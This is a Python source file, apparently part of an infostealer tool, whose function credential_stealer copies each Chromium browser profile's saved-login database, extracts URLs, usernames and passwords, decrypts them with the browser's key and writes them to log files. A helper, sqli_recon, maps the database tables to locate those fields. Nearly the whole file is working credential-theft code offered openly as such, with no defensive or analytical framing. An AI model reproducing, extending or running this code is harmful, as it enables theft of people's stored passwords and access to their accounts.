""" IMPORTS """
import json
import sqlite3
import pywintypes
from util import (
    get_profiles, create_temp_file, create_log_file,
    get_encryption_key, try_decrypt,
)


def credential_stealer(browser: dict) -> None:
    """ Steals credentials from a browser and places them into the logs directory """
    # Examine each profile
    profile_names = get_profiles(browser['path'])
    for profile_name in profile_names:
        # Copy original sqlite3 database to access it without killing any active Chromium processes
        db_path = create_temp_file(browser, profile_name, 'Login Data')

        # Access sqlite3 database
        db_connection = sqlite3.connect(db_path)
        cursor = db_connection.cursor()

        # Extract encrypted credentials from database
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        data = cursor.fetchall()

        # Decrypt credentials
        encryption_key = get_encryption_key(browser['path'])
        credentials = [
            {
                'url': try_decrypt(url, encryption_key),
                'username': try_decrypt(username, encryption_key),
                'password': try_decrypt(password, encryption_key),
            }
            for url, username, password in data
        ]

        # Logs credentials
        if credentials:
            log_file_name = f"{browser['name']} {profile_name} Credentials"
            create_log_file(credentials, log_file_name)

        # Close sqlite3 connection
        cursor.close()
        db_connection.close()



def sqli_recon(db_cursor) -> None:
    """ SQL queries to learn more about the database structure """
    # To find tables
    db_cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
    print(db_cursor.fetchall())
    # Table of interest: logins

    # To find columns for logins table
    db_cursor.execute('PRAGMA table_info(logins)')
    print([row[1] for row in db_cursor.fetchall()])
    # Columns of interest: action_url, username_value, password_value
